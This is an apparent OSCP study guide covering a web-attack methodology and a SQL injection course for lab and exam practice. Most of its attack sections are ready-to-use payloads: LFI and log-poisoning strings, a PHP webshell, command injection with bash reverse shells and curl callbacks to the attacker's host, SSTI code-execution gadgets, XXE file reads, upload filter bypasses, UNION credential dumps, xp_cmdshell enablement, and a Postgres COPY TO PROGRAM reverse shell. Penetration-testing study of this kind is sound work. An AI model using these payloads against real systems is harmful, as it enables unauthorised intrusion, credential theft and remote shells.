# OSCP+ KNOWLEDGE BASE — VOLUME 2
## BREAKING WEBSITES: WEB ATTACK METHOD + SQL INJECTION (beginner course)

> **Read this box first.**
> Websites are the most common way into a box. This volume has two halves: **(A)** a step-by-step method for exploring and attacking any website, and **(B)** a mini-course on SQL injection (attacking the database behind a website).
>
> **Placeholders:** `$IP` = the target (set it: `export IP=10.10.10.5`). `http://$IP` and `http://target` mean the same thing — the website. `<yourIP>` / `<yourKaliIP>` = **your** attacking machine's IP (find it with `ip addr show tun0`). Whenever you discover a hostname (like `blog.corp.local`), immediately add it to `/etc/hosts` (`sudo nano /etc/hosts` → add `<IP>  blog.corp.local`) or your browser/tools can't reach it.
>
> **Tags** like `[WEB-LFI]` are bookmarks — Ctrl+F to jump. `[LOOK-UP]` = niche, look it up when needed.
>
> **The rule that saves you:** *map the whole site before you attack any single part of it.* Rushing straight to one input is the #1 beginner mistake.

---

# [WEB-QUICK]  first 5 minutes on any web port  (one screen)
```bash
whatweb http://$IP        # identify the tech: web server, CMS (WordPress/Joomla…), frameworks   [MUST-MEMORIZE]
curl -sI http://$IP       # show response headers only (server type, redirects, cookie names)
# then by hand: view page source · read /robots.txt · /sitemap.xml · every .js file · HTML comments

# brute-force hidden folders/files (a "content scan"):
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
#   -u  = the target URL
#   -w  = the wordlist of names to try (SecLists ships these; install with: sudo apt install seclists)
#   -x  = also try these file extensions on each word (match the site's tech, e.g. php for a PHP site)

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
#   FUZZ = the placeholder ffuf swaps each wordlist entry into

# if a hostname shows up (a redirect, or in a cert) → brute "virtual hosts":
ffuf -u http://$IP -H "Host: FUZZ.corp.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
#   -H "Host: FUZZ..." = change the Host header (many sites serve DIFFERENT pages per hostname)
#   -fs <size>         = "filter out responses of this byte-size" — set it to the default-page size to hide noise

nikto -h http://$IP       # quick automated sweep for common misconfigurations
```
**What to do with the results:**
1. **Identify the stack + version** (e.g. "WordPress 5.8", "Apache 2.4.49") → `searchsploit <that>` to check for ready-made exploits.
2. **Find the interesting inputs** — login forms, upload forms, and URL parameters (`?id=1`) → these are where you inject attacks.
3. **Find hidden directories/vhosts** → repeat this whole scan on each new area you discover.

---

# [WEB-METHODOLOGY]  the order to work in (map, THEN attack)

### 1. [WEB-FINGERPRINT]  — what is this site built with?
- Run `whatweb` and `curl -sI`. Note the `Server`, `X-Powered-By`, and cookie names — they reveal the tech.
- **Get the version of everything** (CMS, framework, web server) → `searchsploit <product> <version>`. A known-vulnerable version is often the whole box.
- HTTPS site? `openssl s_client -connect $IP:443` — the certificate's CN/SAN fields often leak hostnames and virtual hosts.

### 2. [WEB-CONTENT]  — map every page, file, and input
- **Source & JavaScript:** read the page source and every `.js` file for hidden endpoints, API keys, credentials, and developer comments:
  `curl -s http://$IP/app.js | grep -iE 'api|key|token|passw|secret|/admin'`
- **Well-known paths to check:** `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/.git/`, `/.env`, `/backup`, `/config`.
- **Directory brute-force** (find hidden folders): feroxbuster (auto-recursive) or gobuster/ffuf. Extensions matter — match the stack:
  ```bash
  gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 40
  #   dir      = directory-brute mode
  #   -t 40    = 40 threads (faster)
  gobuster dir -u http://$IP -w <list> -b 403,404 -k    # -b = hide these status codes, -k = ignore TLS cert errors
  ```
- **Files to hunt:** backups (`.bak .old .zip .tar.gz`, `index.php~`), config files (`config.php`, `web.config`, `.env`, `wp-config.php`), and any source-code leaks.
- **Virtual hosts / subdomains:** if any hostname appears, brute the `Host:` header with ffuf and use `-fs` to filter out the default-size response. Add every hit to `/etc/hosts`.
- **Parameters:** note every `?param=value`, hidden form field, and API route. Brute for hidden params:
  `ffuf -u 'http://$IP/page?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>`
- **Authentication surfaces:** login, register, password-reset, admin panels, upload forms, API auth.

### 3. [WEB-AUTH]  — attack the login/session
- Try **default/weak creds** (`admin/admin`, product defaults, any creds you found elsewhere on the box).
- Look at cookies/sessions: predictable session IDs, a tamperable `role=user` value, or a JWT token (→ `[WEB-JWT]`).
- Try **login SQL injection** (auth bypass, `[SQLI]`), username enumeration (a different error or response time for valid vs invalid users), and password-reset logic flaws.

### 4. [WEB-VULN-SELECT]  — pick the attack based on what the input does
Match the clue to the vulnerability class:
- Your input is **shown back on the page** → XSS or SSTI.
- Your input becomes part of a **file path** → LFI/RFI/path traversal.
- Your input goes into a **database query** → SQL injection.
- Your input is passed to an **OS command** → command injection.
- Your input is a **URL the server fetches** → SSRF.
- The app parses **XML** you send → XXE.
- There's a **file upload** → malicious file upload.
- A cookie/blob looks like a **serialized object** → deserialization.
- `id=` lets you see **another user's data** → IDOR.

---

# WEB VULNERABILITY REFERENCE — how to exploit each one

## [WEB-LFI]  Local File Inclusion — trick the site into reading files off its own disk  → `[FOUND-LFI]`
**What it is:** the site takes a filename from your input and displays that file. If you control the path, you can make it read files it never meant to — passwords, config, SSH keys.
**How to spot it:** a parameter that loads a page or file — `?page=`, `?file=`, `?template=`, `?lang=`, `?include=`.
```bash
?page=/etc/passwd                              # can you read a known Linux file? (proves LFI)
?page=../../../../../../etc/passwd             # "../" climbs up folders ("directory traversal") to reach it
?page=....//....//....//etc/passwd             # bypass a filter that strips a single "../"
?page=/etc/passwd%00                           # null byte cuts off an appended ".php" (very old PHP only)
?page=..\..\..\..\windows\win.ini             # Windows version of the same idea

# READ THE SITE'S OWN SOURCE CODE (to find DB creds or the real bug):
?page=php://filter/convert.base64-encode/resource=index.php   # returns the file base64-encoded → decode it locally

# TURN LFI INTO COMMAND EXECUTION:
?page=data://text/plain;base64,<base64-of-php-code>           # if the server allows remote includes
# "log poisoning": first set your browser's User-Agent to  <?php system($_GET['c']);?>  then:
?page=/var/log/apache2/access.log&c=id                        # the log now contains your PHP → it runs
# other useful files: /var/log/auth.log (SSH), /proc/self/environ, /var/mail/<user>, the PHP session file
```
> **What is a "webshell"?** A tiny script (like `<?php system($_GET['c']); ?>`) that, once on the server, lets you run OS commands by visiting a URL (`?c=whoami`). Getting one onto the box is a common goal.

**Grab these:** `/etc/passwd` (user list), the app's config (DB creds), `/home/*/.ssh/id_rsa` (SSH key), `web.config`, `wp-config.php`.
**No log to poison?** Use the **PHP filter-chain** trick to get code execution from pure LFI → `[PARITY3-LFI-FILTERCHAIN]`.
**If it fails:** use the base64 filter to read the source and find the *real* vuln; change how many `../` you use; if `.php` is auto-appended, use `php://filter` or a null byte.
**Where it leads:** creds → spray them · code execution → `[SHELL-QUICK]`.

## [WEB-RFI]  Remote File Inclusion — make the site load YOUR file
**What it is:** like LFI, but the site fetches a file from a URL you give — so you host a webshell on your machine and point it there. Rarer (needs `allow_url_include=On`).
```bash
# 1) On Kali, save a PHP webshell as shell.txt, then serve the folder: python3 -m http.server 80
?page=http://<yourKaliIP>/shell.txt    # site downloads and runs YOUR shell; watch your server for the hit
```
**Where it leads:** code execution → reverse shell.

## [WEB-CMDINJ]  Command Injection — your input reaches the OS shell  → `[FOUND-CMDINJ]`
**What it is:** a feature runs a system tool (ping, nslookup, image/PDF conversion, backup) and sticks your input into the command. Add your own command and it runs too.
**How to spot it:** any feature that clearly runs a program (a "ping this host" box, a converter, etc.).
```bash
; id      | id      & id      && id      `id`     $(id)     %0aid    # separators — try each to chain your command
127.0.0.1; id        127.0.0.1 && whoami          # example: inside a "ping" field
; sleep 5                                          # BLIND test: if the reply takes 5s longer, it worked
; curl http://<yourKaliIP>/x                       # BLIND out-of-band: watch your http server for the request
; bash -c 'bash -i >& /dev/tcp/<yourKaliIP>/443 0>&1'   # get a reverse shell (URL-ENCODE the whole payload!)
& powershell -e <base64>                           # Windows target
```
> **"Blind"** means you don't see the command's output on the page. You confirm it worked indirectly — by a time delay (`sleep 5`) or by making the server contact you (`curl http://you`).

**Getting past filters:** spaces blocked → use `${IFS}` or `<` · characters blocked → `echo <base64>|base64 -d|bash` · quotes in the way → close them first: `"; id;#`.
**Troubleshoot:** URL-encode special characters (`;`=`%3B`, space=`%20`, newline=`%0a`); try every separator.
**Where it leads:** `[SHELL-QUICK]` → stabilise the shell → `[LINUX-PRIVESC]`.

## [WEB-SSRF]  Server-Side Request Forgery — make the server fetch URLs for you
**What it is:** the server fetches a URL you supply. You abuse it to reach things *you* can't — internal-only services, or cloud metadata that holds credentials.
**How to spot it:** a parameter that takes a URL — `url=`, `redirect=`, a webhook field, "fetch from URL", "image from URL".
```bash
?url=http://<yourKaliIP>/                          # confirm it actually fetches (your server gets a hit)
?url=http://127.0.0.1:<port>/                       # reach a service only listening on the server's localhost
?url=http://169.254.169.254/latest/meta-data/       # cloud metadata endpoint → often leaks credentials
# file:// reads local files; gopher:// can talk to internal services (advanced)
```
**Where it leads:** discover internal services (then attack them); cloud metadata → creds.

## [WEB-SSTI]  Server-Side Template Injection — inject into the page-templating engine
**What it is:** many apps build pages from templates. If your input is fed into the template engine unsanitised, you can run code on the server.
**How to spot it:** your input is rendered back *after* server processing (profile names, email templates, error messages).
```bash
${7*7}   {{7*7}}   <%= 7*7 %>   #{7*7}     # if the page prints 49, the engine evaluated it → SSTI
# identify the engine, then use its code-execution gadget:
# Jinja2 (Python):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
# Twig (PHP):
{{ ['id']|filter('system') }}
# Freemarker (Java):
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```
**If it fails:** confirm *which* engine it is first (different syntax); watch for a sandbox; try another gadget.
**Where it leads:** code execution → reverse shell.

## [WEB-XXE]  XML External Entity — abuse an XML parser to read files
**What it is:** if the app parses XML you send, you can define an "entity" that pulls in a local file and echoes it back.
**How to spot it:** the app accepts XML — SOAP APIs, `.xml` uploads, SAML, `Content-Type: application/xml`, even DOCX/SVG (they're XML inside).
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>   <!-- define entity x = contents of /etc/passwd -->
<root><name>&x;</name></root>                            <!-- &x; gets replaced by the file's contents -->
```
**Variations:** blind/out-of-band (use an external DTD to exfiltrate data), SSRF via XXE, PHP `expect://` for RCE, base64 filter to read source.
**Where it leads:** file read → creds/keys → foothold.

## [WEB-UPLOAD]  Malicious File Upload  → `[FOUND-UPLOAD]`
**What it is:** an upload form (avatar, document, image). Goal: upload an executable script (webshell) into a folder the web server will *run*, then visit it.
**How to spot it:** any upload feature.
```bash
# 1) Upload shell.php containing:   <?php system($_GET['c']); ?>
#    Find where it landed (brute /uploads /images), then visit:  http://$IP/uploads/shell.php?c=id
# 2) If .php is blocked, try alternative executable extensions:
shell.php3   shell.php5   shell.phtml   shell.pht   shell.phar
shell.php.jpg    shell.pHp    shell.php%00.jpg           # double extension / mixed case / null byte
# Other filter bypasses: set Content-Type: image/png (but PHP in the body); prepend GIF89a magic bytes;
#   upload a .htaccess to make the server treat a new extension as PHP
# IIS servers → try .asp/.aspx/.config ;  Tomcat → .jsp, or deploy a .war
```
**Troubleshoot:** find the served path (brute `/uploads/`, check the response's Location header); confirm it *executes* with a test `<?php echo 7*7;?>` (should print 49, not the raw text).
**Where it leads:** webshell → reverse shell → `[LINUX-PRIVESC-QUICK]` / `[WINDOWS-PRIVESC-QUICK]`.

## [WEB-DESERIALIZE]  Insecure Deserialization
**What it is:** apps sometimes store objects as encoded blobs (in cookies/params) and rebuild ("deserialize") them on the server. A crafted blob can trick the server into running code.
**How to spot it:** blob-like cookies/params — PHP `O:8:"..."`, Java `rO0AB` (or hex `AC ED 00 05`), .NET `AAEAAAD…`, Python pickle.
**Exploit:** PHP → craft an object / "POP chain" (needs the source); Java → `ysoserial`; .NET → `ysoserial.net`; PHP gadget chains → `phpggc` (`[PARITY2-WEB-EXTRA]`).
**If it fails:** get the source first (via LFI/git). ⚠️ Usually a **rabbit hole without source** → see `[COMMON-RABBIT-HOLES web]`.
**Where it leads:** code execution → shell.

## [WEB-IDOR]  Insecure Direct Object Reference — access data that isn't yours
**What it is:** the app uses guessable IDs (`?id=123`, `/user/5`) and forgets to check you're allowed to see them. Change the number → see someone else's data.
**How to spot it:** sequential IDs in URLs or requests.
**Test:** change the ID; visit admin-only routes directly; flip a `role`/`isAdmin` field in the request.
**Where it leads:** other users' / admin data → creds, or privileged features (upload/exec).

## [WEB-JWT]  JSON Web Tokens — forge your own login token
**What it is:** a JWT is a signed token proving who you are (`header.payload.signature`, three base64 chunks joined by dots). If the signing secret is weak or checking is broken, you can forge an admin token.
**How to spot it:** `Authorization: Bearer eyJ...`, or a cookie with three base64 parts split by dots.
```bash
hashcat -m 16500 jwt.txt rockyou.txt   # crack a weak signing secret → then re-sign the token with role=admin
python3 jwt_tool.py <JWT> -T           # interactive tamper/forge tool   [PARITY2-WEB-EXTRA]
```
**Common attacks:** `alg:none` (drop the signature), weak HMAC secret (crack + re-sign), `kid`/`jku` injection, RS256→HS256 confusion (sign with the public key as the HMAC secret).
**Where it leads:** forged admin token → privileged access.

## [WEB-AUTHBYPASS]  ways to get past a login
SQLi auth bypass (`[SQLI]`) · default/weak creds · password-reset token flaws · "forced browsing" straight to an authenticated page · cookie/`role` tampering · JWT forging (`[WEB-JWT]`) · HTTP verb tampering · 403-bypass tricks (`[WEB-403-BYPASS]`) · 2FA bypass.

## [WEB-XSS]  Cross-Site Scripting  (rarely the OSCP path — just recognise it)
Reflected/stored/DOM XSS runs your JavaScript in a victim's browser. **Low value on OSCP** because there's usually no real victim to attack — unless the box simulates an admin who visits pages. Test with `<script>alert(1)</script>`; only useful for session theft/CSRF when a victim exists.

## [COMMON-RABBIT-HOLES web]  — where beginners waste hours
- Endless directory-brute with giant wordlists → use a *medium* list, go recursive, then move on.
- Chasing XSS on a box with no victim.
- Deserialization/XXE without the source code → get source first, or skip.
- Fuzzing one parameter forever → map the *whole* app instead.
- Chasing a CVE that needs a login you don't have.

---

# [SQLI]  SQL INJECTION — attacking the database (mini-course)

> **What is SQL injection?** Websites store data in a database and ask it questions using SQL. If the site drops your input straight into that question, you can rewrite the question — to log in without a password, or to dump every user's password hash. This section teaches it from scratch.

## [SQLI-QUICK]  the core moves  (one screen)
```sql
DETECT:   type a single quote  '  (or ")  → does the page error or behave differently? then it may be injectable
          confirm:  ' OR 1=1-- -   (always true)   vs   ' AND 1=2-- -   (always false)
COUNT:    ' ORDER BY 1-- -   then 2, 3, …   → keep going until it errors = number of columns
UNION:    ' UNION SELECT 1,2,3-- -          → see which numbers print on the page (those are your "output slots")
IDENTIFY: put version()/@@version into a printing slot → learn which database it is
BLIND:    page changes for  ' AND 1=1-- -  but not  ' AND 1=2-- -   → "boolean blind"
          nothing shows but  ' AND SLEEP(5)-- -  delays the reply → "time blind"
LOGIN BYPASS:  put   ' OR 1=1-- -   in the username field
```
> **`-- -`** is a SQL comment — it tells the database to ignore the rest of the original query (the trailing space after `--` matters). MySQL also accepts `#`.

## [SQLI-DECISION-TREE]  which technique do I use?
```
1. Injectable?  Type '  → error or changed page = yes.
2. Does the page SHOW query results or errors?
   YES, results show   → count columns (ORDER BY) → UNION SELECT → read data directly   (fastest)
   YES, error text shows → error-based extraction (data leaks inside the error message)
   NO output, but page changes on true/false → BOOLEAN blind (extract one character at a time)
   NO change at all      → TIME-based blind (use SLEEP/WAITFOR to read data by delay)
3. Identify the database (MySQL? MSSQL? Postgres?) → use THAT database's syntax below.
4. Enumerate: list databases → tables → columns → dump the creds.
5. Escalate: can you read/write files or run OS commands? (depends on the database)
```

## [SQLI-DETECT]  proving it's injectable
- Break the query: `'`, `"`, `)`, `';`. Watch for a SQL error, a 500, a blank page, or different content.
- Confirm you control the logic: `' AND 1=1-- -` (page normal) vs `' AND 1=2-- -` (page changes/empties) → injectable and controllable.
- Numeric fields (no quotes needed): `1 AND 1=1` vs `1 AND 1=2`.
- Comment styles to try: `-- -` (note the trailing space), `#` (MySQL), `/*...*/`, `;--`.
- **Login bypass:** username `admin'-- -` (logs in as admin, ignoring the password check) or `' OR 1=1 LIMIT 1-- -`.

## [SQLI-UNION]  union-based extraction (when results are shown)
1. **Count the columns:** `' ORDER BY 1-- -`, then `2`, `3`… until it errors. The last number that worked = the column count. (Alternative: `' UNION SELECT NULL-- -`, add `NULL`s until no error.)
2. **Find the printing columns:** `' UNION SELECT 1,2,3-- -` → note which numbers actually appear on the page. Those slots are where your stolen data will show.
3. **Identify the database:** put `@@version` / `version()` into a printing slot.
4. **Extract data:** replace a printing number with your data query (see the per-database sections).
- **Data types don't match / errors?** Use `NULL` for columns you're not using, or wrap values in a cast-to-text.

## [SQLI-BLIND]  boolean & time-based (when nothing is shown)
- **Boolean blind:** ask true/false questions and read the answer from whether the page changes. Example — is the first letter of the password an 'a'?
  `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -` → page "true" or "false". Repeat for each character. **Automate this** (a short Python script).
- **Time blind:** same idea, but the "yes" is a delay:
  `' AND IF(1=1,SLEEP(5),0)-- -` (MySQL) · `'; IF(1=1) WAITFOR DELAY '0:0:5'-- -` (MSSQL) · `' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -` (Postgres).
- Blind is painfully slow by hand → sqlmap would automate it, **but sqlmap is BANNED on the exam** (`[SQLI-SQLMAP]`). Write a small script to loop the characters instead.

---

## [SQLI-MYSQL]  MySQL / MariaDB
- **Identify:** `@@version` / `version()`; comment `#`; `database()`, `current_user()`; errors say "You have an error in your SQL syntax".
- **Count columns:** `' ORDER BY N-- -` or `' UNION SELECT NULL,NULL-- -`.
- **Enumerate** (MySQL keeps a catalogue of its own structure in `information_schema`):
```sql
-- list databases:
' UNION SELECT schema_name,2 FROM information_schema.schemata-- -
-- list tables in the current database:
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
-- list columns in the 'users' table:
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
-- dump usernames:passwords (0x3a is a ':' separator):
' UNION SELECT concat(user,0x3a,password),2 FROM users-- -
```
(Wrap in `group_concat(...)` to pull many rows into one cell.)
- **File read/write (RCE):** with the `FILE` privilege → read `' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -`; write a webshell `... INTO OUTFILE '/var/www/html/sh.php'` (needs `secure_file_priv` empty and a writable path). UDF RCE if the plugin dir is writable `[LOOK-UP]`.
- **Creds:** dump the app's `users` table → hashes → crack with `hashcat` or reuse.

## [SQLI-MSSQL]  Microsoft SQL Server  → also `[ENUM-MSSQL]`
- **Identify:** `@@version`, `SELECT @@servername`; comment `--`; string join is `+`; `WAITFOR DELAY` exists.
- **Enumerate:**
```sql
' UNION SELECT name,2 FROM master..sysdatabases-- -                                   -- databases
' UNION SELECT table_name,2 FROM information_schema.tables-- -                          -- tables
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -  -- columns
' UNION SELECT @@version,2-- -                                                          -- version
```
- **Error-based (when UNION won't show):** `' AND 1=CONVERT(int,(SELECT @@version))-- -` — the data leaks inside the type-conversion error.
- **Command execution (the payoff)** — turn on `xp_cmdshell` and run OS commands:
```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
```
- **Steal a hash:** `'; EXEC xp_dirtree '\\<yourKaliIP>\x';-- -` → catch it on Responder. Stacked queries (`;`) usually work here.
- Impersonation / linked servers → lateral movement (see `[ENUM-MSSQL]`).

## [SQLI-POSTGRES]  PostgreSQL  → also `[ENUM-POSTGRES]`
- **Identify:** `version()`; string join is `||`; comment `--`; cast errors mention "pg".
- **Enumerate:**
```sql
' UNION SELECT table_name,2 FROM information_schema.tables-- -
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
```
- **Command execution:** `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<yourKaliIP>/443 0>&1"';` (needs superuser, v9.3+). **File read:** `CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT x FROM t;`.
- **Time blind:** `' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -`.

## [SQLI-SQLITE]  SQLite
- **Identify:** `sqlite_version()`; there's no `information_schema`.
- **Enumerate:**
```sql
' UNION SELECT name,2 FROM sqlite_master WHERE type='table'-- -                       -- tables
' UNION SELECT sql,2 FROM sqlite_master WHERE type='table' AND name='users'-- -        -- table's schema
```
- No `xp_cmdshell`; RCE only via an ATTACH-write-to-webroot in specific apps `[LOOK-UP]`. Mostly used to dump creds.

## [SQLI-SQLMAP]  (⛔ BANNED on the exam — practice/learning only)
```bash
sqlmap -r req.txt --batch                     # feed it a saved Burp request (best accuracy)
sqlmap -u 'http://$IP/p?id=1' --batch --dbs   # auto-detect + list databases
sqlmap -u '...' -D appdb --tables ; --dump -T users
sqlmap -r req.txt --os-shell                   # try for a shell if file/exec is possible
```
Useful flags: `--level 5 --risk 3` (dig deeper), `--technique=BEUST`, `--tamper=space2comment` (evade a filter), `-p param`, `--threads 5`.
**⛔ EXAM RULE:** sqlmap is an *automatic-exploitation* tool and is **banned** (`[EXAM-RULES-2026]`). Use it only in **practice** to learn what manual injection should look like. On the exam, do **all** SQLi by hand using the sections above.

## [SQLI-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| No error, no change | maybe not injectable, or fully blind → try time-based |
| UNION: "different number of columns" | wrong column count → recount with ORDER BY |
| UNION runs but no data shows | your data landed in a non-printing column → move it to a printing slot; cast to text |
| Quotes are filtered | use `CHAR()` or `0x` hex encoding, or a numeric field |
| Spaces are filtered | `/**/`, `%09` (tab), `+`, or parentheses |
| Keywords filtered (a WAF) | change case, or inline comments: `UNI/**/ON` |
| `-- -` doesn't work | try `#`, `-- ` (space), `/*...*/`, or `;%00` |
| Works in Burp but not the browser | it's URL-encoding — encode the payload; use Burp Repeater |

**If SQLi fails entirely:** double-check the input really goes to a database (it might be LFI or command injection instead); test other parameters; check the POST body, headers, and cookies for injection too.
**After SQLi:** dump creds → `[FOUND-CREDS]` and spray them; MSSQL/Postgres → RCE → `[SHELL-QUICK]`; MySQL FILE priv → webshell.

---
*End Volume 2. Next: Volume 3 — turning a bug into a real shell, moving files, and cracking the credentials you find.*
